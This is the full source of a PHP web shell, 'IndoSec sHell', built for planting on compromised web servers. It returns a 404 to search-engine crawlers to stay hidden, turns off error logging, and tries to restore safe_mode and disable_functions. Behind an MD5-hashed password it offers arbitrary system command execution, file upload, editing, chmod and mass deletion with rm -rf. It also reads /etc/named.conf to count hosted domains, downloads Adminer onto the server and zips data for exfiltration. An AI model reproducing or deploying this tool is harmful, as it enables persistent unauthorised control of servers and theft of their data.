<?php

/*
	* Konsep Shell : Brillyan -Founder { IndoSec }-
	* Pembuat : Rizsyad AR - { IndoSec }
	
	* Re-Code Boleh Asal Dah Izin Sama Pembuat, Ganti Author & Re-Code Tanpa Seizin Pembuat... Fix Lo Noob Anjenk
	* Klo Kga Bisa Bikin Cek Chanel IndoSec, Ada Tutornya, Jangan Cuma Bisa Ganti Author Doank Bangsad
	

	* Thanks For All Member { IndoSec }, Yang Telah Membantu Proses Pembuatan Shell,Dan Dari Shell Lain Untuk Inspirasinya

	* { IndoSec sHell }
	* @2022 { IndoSec } -Rizsyad AR-
	* Nb: shell ini blm sepenuhnya selesai, jadi kalau menemukan error/tampilan tidak bagus/tidak responsive harap dimaklumi.  V 0.1
*/

if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}

session_start();
error_reporting(0);
@set_time_limit(0);
@ignore_user_abort(0);
@clearstatcache();

if (@function_exists('ini_set')) {
	@ini_set('error_log', NULL);
	@ini_set('log_errors', 0);
	@ini_set('max_execution_time', 0);
	@ini_set('output_buffering', 0);
	@ini_set('display_errors', 0);
	@ini_set('memory_limit', '999999999M');
	@ini_set('zlib.output_compression', 'Off');
} else {
	@ini_alter('error_log', NULL);
	@ini_alter('log_errors', 0);
	@ini_alter('max_execution_time', 0);
	@ini_alter('output_buffering', 0);
	@ini_alter('display_errors', 0);
	@ini_alter('memory_limit', '999999999M');
	@ini_alter('zlib.output_compression', 'Off');
}

@ini_restore('safe_mode');
@ini_restore("safe_mode_include_dir");
@ini_restore("safe_mode_exec_dir");
@ini_restore("disable_functions");
@ini_restore("allow_url_fopen");
@ini_restore("open_basedir");

/* Configurasi */
$aupas 					= "54062f3bf6377d42b4fab7c8fedfc7da"; // IndoSec
$_SESSION["password"] 	= $aupas;

function curlRequest($url)
{
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	$content = curl_exec($ch);
	curl_close($ch);
	return $content;
}

// mendapatkan content page
function getContentPage($page, $search = "", $replace = "") 
{
	$url = "https://raw.githubusercontent.com/Rizsyad/IndoSec-ShEll/main/page/$page.html";

	$content = (curlRequest($url) ?? file_get_contents($url));

	if($search != "" && $replace != "") {
		echo str_replace($search, $replace, $content);
		return;
	}

	echo $content;
}

// mendapatkan file image
function getImageUrl($ext) 
{
    return "https://raw.githubusercontent.com/Rizsyad/IndoSec-ShEll/main/assets/img/$ext.png";
}

function image($ext, $attr) {
	return "<img src='".getImageUrl($ext)."' onerror=\"this.src='".getImageUrl("file")."';\" $attr loading='lazy'/>";
}

function check($password)
{
    return (md5($password) === $_SESSION["password"]);
}

function download($file)
{
    @ob_clean();
	header('Content-Description: File Transfer');
	header('Content-Type: application/octet-stream');
	header('Content-Disposition: attachment; filename="'.basename($file).'"');
	header('Expires: 0');
	header('Cache-Control: must-revalidate');
	header('Pragma: public');
	header('Content-Length: ' . filesize($file));
	readfile($file);
	exit;
}

function w($dir,$perm)
{
    return !is_writable($dir) ? "<font color='red'>".$perm."</font>" : "<font color='lime'>".$perm."</font>";
}

function exe($cmd)
{
	$buff = '';

	if(function_exists('system'))
    {
		@ob_start();
		@system($cmd);
		$buff = @ob_end_clean();
	} 
    elseif(function_exists('exec'))
    {
		@exec($cmd,$results);
		$buff = @join("\n",$results);
	} 
    elseif(function_exists('passthru'))
    {
		@ob_start();
		@passthru($cmd);
		$buff = @ob_end_clean();
	} 
    elseif(function_exists('shell_exec'))
    {
		$buff = @shell_exec($cmd);
	}
	return $buff;
}

function perms($file)
{
	$perms = fileperms($file);
	if (($perms & 0xC000) == 0xC000){
		// Socket
		$info = 's';
	}elseif (($perms & 0xA000) == 0xA000){
		// Symbolic Link
		$info = 'l';
	}elseif (($perms & 0x8000) == 0x8000){
		// Regular
		$info = '-';
	}elseif (($perms & 0x6000) == 0x6000){
		// Block special
		$info = 'b';
	}elseif (($perms & 0x4000) == 0x4000){
		// Directory
		$info = 'd';
	}elseif (($perms & 0x2000) == 0x2000){
		// Character special
		$info = 'c';
	}elseif (($perms & 0x1000) == 0x1000){
		// FIFO pipe
        $info = 'p';
	}else{
		// Unknown
		$info = 'u';
	}

	// Owner
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
	(($perms & 0x0800) ? 's' : 'x' ) :
	(($perms & 0x0800) ? 'S' : '-'));

	// Group
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
	(($perms & 0x0400) ? 's' : 'x' ) :
	(($perms & 0x0400) ? 'S' : '-'));
		
	// World
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
	(($perms & 0x0200) ? 't' : 'x' ) :
	(($perms & 0x0200) ? 'T' : '-'));
	return $info;
}

function formatSize( $bytes ){
	$types = array( 'B', 'KB', 'MB', 'GB', 'TB' );
	for( $i = 0; $bytes >= 1024 && $i < ( count( $types ) -1 ); $bytes /= 1024, $i++ );
	return( round( $bytes, 2 )." ".$types[$i] );
}

function formatSize1( $bytes ){
	return( round( $bytes, 2 ) );
}

function ambilKata($param, $kata1, $kata2)
{
	if(strpos($param, $kata1) === FALSE) return FALSE;
	if(strpos($param, $kata2) === FALSE) return FALSE;
	$start = strpos($param, $kata1) + strlen($kata1);
	$end = strpos($param, $kata2, $start);
	$return = substr($param, $start, $end - $start);
	return $return;
}

function swall($title, $text, $type, $dir)
{
    echo "
	<script>
    Swal.fire({
        title: '$title',
        text: '$text',
        icon: '$type',
    }).then((value) => {
        window.location = '$dir';
    })
	</script>
    ";
}

function countDomain() 
{
	global $d0mains;
    if (!$d0mains) return "<font color=red size=2px>Cant Read [ /etc/named.conf ]</font>";

    $count = 0;
	foreach ($d0mains as $d0main) {
		if (@strstr($d0main, "zone")){
			preg_match_all('#zone "(.*)"#', $d0main, $domains);
			flush();
			if (strlen(trim($domains[1][0])) > 2){
				flush();
				$count++;
			}
		}
	}

	return $count;
}

function login_shell()
{
	getContentPage("login");
}

function zipFile($data, $dir, $type)
{
	if(!function_exists('ZipArchive') && !extension_loaded('zip')) return false;

	$zip = new ZipArchive();

	if($type === "zip")
	{
		if(!file_exists($data)) return false;

		$data = realpath($data);
		$zip->open(basename($dir).".zip", ZIPARCHIVE::CREATE | ZipArchive::OVERWRITE);

		if(is_file($data)) $zip->addFromString(basename($data), file_get_contents($data));

		if(is_dir($data)) {
			$files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($data), RecursiveIteratorIterator::SELF_FIRST);
			foreach ($files as $file) {
				$file = realpath($file);
				if(is_file($file)) {
					$zip->addFromString(str_replace($data . '/', '', $file), file_get_contents($file));
				}
			}
		}
	}
	else
	{
		$res = $zip->open($data);
		if(!$res) return false;

		$name = basename($data, ".zip")."_unzip";
		@mkdir($name);
		@$zip->extractTo($dir."/".$name);
	}

	@$zip->close();
	return true;
}

function breadcrumb($page)
{
	$li = "";
	$exclude = array("files");

	for ($i=0; $i < count($page); $i++) { 
		$pages = strtolower(preg_replace('/\s+/', '', $page[$i]));

		if($i+1 === count($page)) $li .= "<li class='active'>".$page[$i]."</li>";
		else if(in_array($pages, $exclude)) $li .= '<li><a href="#">'.$page[$i].'</a></li>';
		else $li .= '<li><a href="?page='.$pages.'">'.$page[$i].'</a></li>';
	}

	echo '<div class="breadcrumbs">
    <div class="col-sm-4">
      <div class="page-header float-left">
        <div class="page-title">
          <h1>Dashboard</h1>
        </div>
      </div>
    </div>
    <div class="col-sm-8">
      <div class="page-header float-right">
        <div class="page-title">
          <ol class="breadcrumb text-right">
            '.$li.'
          </ol>
        </div>
      </div>
    </div>
  </div>';
}

function template($page, $bc, $search, $replace)
{
	getContentPage("components/header");
	getContentPage("components/sidebar");
	getContentPage("components/rightpanel");
	breadcrumb($bc);
	getContentPage($page, $search, $replace);
	getContentPage("components/footer", $search, $replace);
}

function pages($page, $bc, $search = "", $replace = "")
{
	template($page, $bc, $search, $replace);
}

if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
	if(!isset($_POST['pass']) || !check($_POST['pass'])) return login_shell();
	$_SESSION[md5($_SERVER['HTTP_HOST'])] = TRUE;
}

if(isset($_GET['path'])){
	$path = $_GET['path'];
	chdir($path);
} else {
	$path = getcwd();
}

$path 			= @str_replace('\\','/',$path);
$paths 			= explode('/',$path);
$os 			= php_uname();
$ip 			= getHostByName(getHostName());
$ver 			= phpversion();
$web 			= $_SERVER['HTTP_HOST'];
$sof 			= $_SERVER['SERVER_SOFTWARE']; 
$curl 			= (function_exists('curl_version')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>";
$mail 			= (function_exists('mail')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>";
$sm 			= (function_exists('safe_mode')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>";
$zip 			= (!function_exists('ZipArchive') && !extension_loaded('zip')) ? "<font color=red>NONE</font>" :  "<font color=green>ON</font>";
$total 			= disk_total_space($path);
$free 			= disk_free_space($path);
$usage			= (formatSize1($total)-formatSize1($free));
$ds 			= @ini_get("disable_functions");
$apachemodul 	= (function_exists("apache_get_modules")) ? implode(', ', apache_get_modules()) : "<font color=red>NONE</font>";
$show_ds 		= (!empty($ds)) ? "<a href='?path=$path&aksi=disabfunc' class='ds'>$ds</a>" : "<font color=green>NONE</font>";
$d0mains 		= @file("/etc/named.conf", false);

$supportDB = array();
if(function_exists('mysqli_get_client_info') || function_exists('mysql_get_client_info')) $supportDB[] = "MySQL / MySQLi (".mysqli_get_client_info().")";
if(function_exists('mssql_connect')) $supportDB[] = "MSSQL";
if(function_exists('pg_connect')) $supportDB[] = "PostgreSQL";
if(function_exists('oci_connect')) $supportDB[] = "Oracle";
$supportDB = implode(', ', $supportDB);

function printPath()
{
	global $paths;
	global $path;
	global $page;
	$ph = "";

	foreach($paths as $id => $pat){
		if($pat == '' && $id == 0){			
			$ph .= "<a href='?page=$page&path=/'>/</a>";
			continue;
		} if($pat == '') continue;
		$ph .= "<a style='word-wrap:break-word;' href='?page=$page&path=";
		for($i=0;$i<=$id;$i++){
			$ph .= "$paths[$i]";
			if($i != $id) $ph .= "/";
		}
		$ph .= "'>".$pat."</a>/";
	}
	$ph .= " [".w($path, perms($path))."]";

	return $ph;
}

function current_path($pages = "", $paths = ""){
	global $path;
	global $page;

	$page = $pages ? $pages : $page;
	$path = $paths ? $paths : $path;

	return "?page=$page&path=$path";
}

function isImage($name) {
	$ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
	return preg_match('/(jpg|png|gif|jpeg|gif)$/i', $ext, $matches, PREG_OFFSET_CAPTURE, 0);
}

function actionMultiDelete($dir) {

	if(is_writable($dir)) {
		$paths = scandir($dir);

		foreach ($paths as $path) {
			if($path == "." || $path == "..") continue;
			$dirs = "$dir/$path";

			if(!is_dir($dirs)) @unlink($dirs);

			if(is_dir($dirs) && is_readable($dirs)) {
				@rmdir($dirs);
				@exe("rm -rf $dirs");
				@exe("rmdir /s /q $dirs");
			}
		}
		return true;
	}
	return false;
}

function newfile(){

	global $path;

	pages("newfile", ["Files", "File Manager", "New File"]);

	if(isset($_POST["bikin"]))
	{
		$name = $_POST['nama_file'];
		$isi_file = $_POST['isi_file'];

		$handle = @fopen("$path/$name", "w");
		$buat = @fwrite($handle, $isi_file);
		if($buat) return swall("Success", "Berhasil Membuat File", "success", current_path("filemanager", $path));

		return swall("Success","Gagal Membuat File", "success", current_path("filemanager", $path));
	}
}

function newfolder(){

	global $path;

	pages("newfolder", ["Files", "File Manager", "New Folder"]);

	if(isset($_POST["bikin"]))
	{
		$name = $_POST['nama_folder'];
		$fd = @mkdir($name);
		if($fd) return swall("Success", "Berhasil Membuat File", "success", current_path("filemanager", $path));

		return swall("Success","Gagal Membuat File", "success", current_path("filemanager", $path));
	}
}

function viewfile()
{
	global $path;
	$ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));

	if(isImage($path)) {
		$content = "<br/><img src='data:image/$ext;base64,".base64_encode(@file_get_contents($path))."' class='img-fluid mt-3'  />";
	} else {
		$content = '<textarea rows="13" class="form-control mt-3" disabled="">'.htmlspecialchars(@file_get_contents($path)).'</textarea>';
	}
	
	$name = basename($path);
	$namefile = image($ext, "style='width: 25px;'")." ".$name;
	
	pages("viewfile", ["Files", "File Manager", "View File"], array("{{CONTENTFILE}}", "{{NAMEFILE}}"), array($content, $namefile));
}

function renameF()
{
	global $path;

	$ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
	$name = basename($path);
	$namefile = image($ext ? $ext : 'folder', "style='width: 25px;'")." ".$name;

	pages("renamefile", ["Files", "File Manager", "Rename ".($ext ? "File" : 'Folder')], array("{{NAMEFILE}}", "{{NAME}}"), array($namefile, $name));

	if(isset($_POST['rename']))
	{
		$lama = $path;
		$baru = $_POST['new'];
		
		if(is_dir($lama))
		{
			$ubah = rename($lama, dirname($lama)."/".$baru);
		}
		else
		{
			
			if(file_exists($baru)) 
			{
				$path = dirname($lama);
				return swall("Error", "Nama $baru Telah Digunakan", "error",  current_path("filemanager", $path));
			} 

			$ubah = rename($lama, $baru);
		}

		if($ubah) 
		{
			$path = dirname($lama);
			return swall("Success", "Berhasil Mengganti Nama Menjadi $baru", "success",  current_path("filemanager", $path));
		} 

		$path = dirname($lama);
		swall("Error", "Gagal Mengganti Nama", "error", current_path("filemanager", $path));
	}
}

function editF()
{
	global $path;

	$content = '<textarea rows="13" class="form-control mt-3 mb-3" name="isi">'.htmlspecialchars(@file_get_contents($path)).'</textarea>';
	$ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
	$name = basename($path);
	$namefile = image($ext, "style='width: 25px;'")." ".$name;
	
	pages("edit", ["Files", "File Manager", "Edit File"], array("{{CONTENTFILE}}", "{{NAMEFILE}}"), array($content, $namefile));

	if(isset($_POST['edit']))
	{
		$updt = fopen($path, "w");
		$hasil = fwrite($updt, $_POST['isi']);
		if ($hasil) return swall("Success", "Berhasil Update File", "success", current_path("filemanager", dirname($path)));
		return swall("Error", "Gagal Update File", "error", current_path("filemanager", dirname($path)));
	}
}

function chmods()
{
	global $path;

	$name = basename($path);
	$ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
	$namefile = image($ext ? $ext : 'folder', "style='width: 25px;'")." Chmod ".($ext ? "File" : 'Folder')." : ".$name;
	$perms = substr(sprintf('%o', fileperms($path)), -4);

	pages("chmod", ["Files", "File Manager", "Chmod ".($ext ? "File" : 'Folder')], array("{{FILEPERMS}}", "{{NAMEFILE}}"), array($perms, $namefile));

	if(isset($_POST['chmo'])){
		if(@chmod($path,$_POST['perm'])) return swall("Success", "Change Permission Berhasil", "success", current_path("filemanager", dirname($path)));
		return swall("Error", "Change Permission Gagal", "error", current_path("filemanager", dirname($path)));
	}
}

function upload(){
	global $path;

	$ph = printPath();
	$dir_current = current_path();

	pages("upload", ["Files", "Upload Files"], array("{{PATH}}"), array($ph));

	if(isset($_POST["upload"])) {
		$jumlah = count($_FILES['file']['name']);
		for($i=0; $i < $jumlah;$i++){
			$filename = $_FILES['file']['name'][$i];
			$up = @copy($_FILES['file']['tmp_name'][$i], "$path/".$filename);
		}
		if($jumlah > 1) return swall("Success", "Berhasil Upload $jumlah File", "success", $dir_current);
		if($up) return swall("Success", "Berhasil Upload $filename", "success", $dir_current);
		
		swall("Error", "Gagal Upload File", "error", $dir_current);
	}
}


function hapus() {
	global $path;

	pages("blank", [""]);

	if(is_dir($path) && is_readable($path) ) {
		if(@rmdir($path) || @exe("rm -rf $path") || @exe("rmdir /s /q $path")) return swall("Success", "Berhasil Menghapus", "success",  current_path("filemanager", dirname($path)));
	}

	if(unlink($path)) return swall("Success", "Berhasil Menghapus", "success",  current_path("filemanager", dirname($path)));

	return swall("Error", "Gagal Menghapus", "error",  current_path("filemanager", dirname($path)));
}

function mdelete()
{
	global $path;

	pages("massdelete", ["Mass", "Mass Delete"], array("{{PATH}}", "{{IMG}}"), array($path, image('folder', 'style="width: 25px;"')));

	if(isset($_POST["delete"]))
	{
		$spath = $_POST["d_dir"];

		if(actionMultiDelete($spath)) return swall("Success", "Berhasil Multi Menghapus", "success",  current_path("mdelete"));
		return swall("Error", "Gagal Multi Menghapus", "error",  current_path("mdelete"));
	}
}

function filemanager()
{
	global $path;
	global $page;

	$ph = printPath();
	$fm = "";

	$scandir = scandir($path);

	foreach ($scandir as $dir) {

		if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;

		$dtime = date("l d/m/y G:i", filemtime("$dir/"));

		if (strlen($dir) > 18) {
			$_dir = substr($dir, 0, 18)."...";
		} else {
			$_dir = $dir;
		}

		$fm .= "<tr>
			<td>
				".image("folder", "style='width: 25px;'")."
				<a href='?page=$page&path=$path/$dir'>$_dir</a>
			</td>
			<td>--</td>
			<td>$dtime</td>
			<td>".mime_content_type("$path/$dir")."</td>
			<td><a title='chmod' href='?page=chmod&path=$path/$dir'>".w("$path/$dir", perms("$path/$dir"))."</a></td>
			<td class='text-white d-flex'>
				<a title='Rename' class='badge badge-success ml-2' href='?page=rename&path=$path/$dir'><i class='fa fa-pen'></i></a>
				<a title='Delete' class='badge badge-danger ml-2' href='?page=delete&path=$path/$dir'><i class='fa fa-trash'></i></a>
			</td>
		</tr>";
	}

	foreach($scandir as $file) {

		if(!is_file($path.'/'.$file)) continue;

		$dtime = date("l d/m/y G:i", filemtime("$path/$file"));
		$ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));

		if (strlen($file) > 25){
			$_file = substr($file, 0, 25)."...-.".$ext;												
		} else {
			$_file = $file;
		}

		$fm .= "<tr>
			<td>
				".image($ext, "style='width: 25px;'")."
				<a href='?page=viewfile&path=$path/$file'>$_file</a>
			</td>
			<td>".formatSize(filesize($file))."</td>
			<td>$dtime</td>
			<td>".mime_content_type("$path/$file")."</td>
			<td><a title='chmod' href='?page=chmod&path=$path/$file'>".w("$path/$file", perms("$path/$file"))."</a></td>
			<td class='text-white d-flex'>
				<a title='Lihat' class='badge badge-info ml-2' href='?page=viewfile&path=$path/$file'><i class='fa fa-eye'></i></a>
				<a title='Edit' class='badge badge-success ml-2' href='?page=edit&path=$path/$file'><i class='far fa-edit'></i></a>
				<a title='Rename' class='badge badge-success ml-2' href='?page=rename&path=$path/$file'><i class='fa fa-pen'></i></a>
				<a title='Delete' class='badge badge-danger ml-2' href='?page=delete&path=$path/$file'><i class='fa fa-trash'></i></a>
				<a title='Download' class='badge badge-primary ml-2' href='?page=download&path=$path/$file'><i class='fa fa-download'></i></a>
			</td>
		</tr>";
	}

	$button = "<div class='d-flex mt-3'><a class='btn btn-primary btn-sm text-white mr-3' href='?page=newfile&path=$path'>Tambah File</a><a class='btn btn-primary btn-sm text-white mr-3' href='?page=newfolder&path=$path'>Tambah Folder</a></div>";

	pages("filemanager", ["Files", "File Manager"], array("{{PATH}}", "{{FILEMANAGER}}", "{{BUTTON}}"), array($ph, $fm, $button));
}

function downloadAdminer()
{
	$content = curlRequest("https://raw.githubusercontent.com/Rizsyad/IndoSec-ShEll/main/includes/adminer.php");
	$fp 	= @fopen("adminer.php", "w");
	$buat 	= @fwrite($fp, $content);
	fclose($fp);
	return $buat;
}

function adminer()
{
	global $path;

	$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $path);

	pages("blank", ["Database", "Adminer"]);

	if (file_exists("adminer.php")) echo "<a href='$full/adminer.php' target='_blank' class='text-center btn btn-success btn-block mb-3'>Login Adminer</a>"; return;
	if (downloadAdminer()) echo "<p class='text-center'>Berhasil Membuat Adminer</p><a href='$full/adminer.php' target='_blank' class='text-center btn btn-success btn-block mb-3'>Login Adminer</a>"; return;
	echo "<p class='text-center text-danger'>Gagal Membuat Adminer</p>";
}

function backup() {
	
	global $path;

	pages("backup", ["Files", "Backup"], array("{{PATHZIP}}", "{{PATH}}"), array("$path.zip", $path));

	if(isset($_POST["upnun"])) {
		$filename 	= $_FILES["zip_file"]["name"];
		$tmp 		= $_FILES["zip_file"]["tmp_name"];

		if(!move_uploaded_file($tmp, "$path/$filename")) return swall("Error", "Gagal Upload Zip", "error", current_path("backup"));

		if(!zipFile($filename, $path, "extract")) {
			swall("Error", "Gagal Mengekstrak Zip", "error", current_path("backup"));
			unlink($filename);
			return;
		}
		
		unlink($filename);

		return swall("Success", "Success Mengekstrak Zip", "success", current_path("backup"));
	}

	if(isset($_POST["backup"])) {
		$fol = $_POST['folder'];

		if(!zipFile($fol, $fol, "zip")) return swall("Error", "Gagal Mengkompres Zip", "error", current_path("backup"));
		return swall("Success", "Success Mengkompres Zip", "success", current_path("backup"));
	}

	if(isset($_POST["extrak"])) {
		$zip = $_POST["file_zip"];

		if(!zipFile($zip, $path, "extract")) return swall("Error", "Gagal Mengekstrak Zip", "error", current_path("backup"));
		return swall("Success", "Success Mengekstrak Zip", "success", current_path("backup"));
	}

}

if(isset($_GET["page"]))
{
	$page = $_GET["page"];

	// File
	if($page == "filemanager") filemanager();
	if($page == "upload") upload();
	if($page == "viewfile") viewfile();
	if($page == "rename") renameF();
	if($page == "delete") hapus();
	if($page == "edit") editF();
	if($page == "chmod") chmods();
	if($page == "newfile") newfile();
	if($page == "newfolder") newfolder();
	if($page == "download") download($path);
	if($page == "backup") backup();

	// Mass
	// if($page == "mdeface") mdeface();
	if($page == "mdelete") mdelete();

	// Database
	if($page == "adminer") adminer();

	// Info
	if($page == "about") pages($page, ["About"]);
	if($page == "phpinfo") phpinfo();

	if($page == "logout") {
		session_destroy() ;
		echo '<script>window.location="?";</script>';
	} 
} 
else 
{
	$arrFind = [
		"{{countDomain}}", 
		"{{PHPVERSION}}", 
		"{{IPSERVER}}",
		"{{SUPPORTDB}}",
		"{{CURL}}",
		"{{MAILER}}",
		"{{DF}}",
		"{{SOFT}}",
		"{{OS}}",
		"{{FREEUSAGE}}",
		"{{USAGE}}",
		"{{TOTALUSAGE}}",
		"{{APACHE}}",
		"{{SM}}",
		"{{ZIP}}",
	];

	$arrReplace = [ 
		countDomain(), 
		$ver, 
		$ip,
		$supportDB,
		$curl,
		$mail,
		$show_ds,
		$sof,
		$os,
		formatSize1($free),
		$usage,
		"Total: ".formatSize($total),
		$apachemodul,
		$sm,
		$zip
	];

	pages("dashboard", ["Dashboard"], $arrFind, $arrReplace);
}
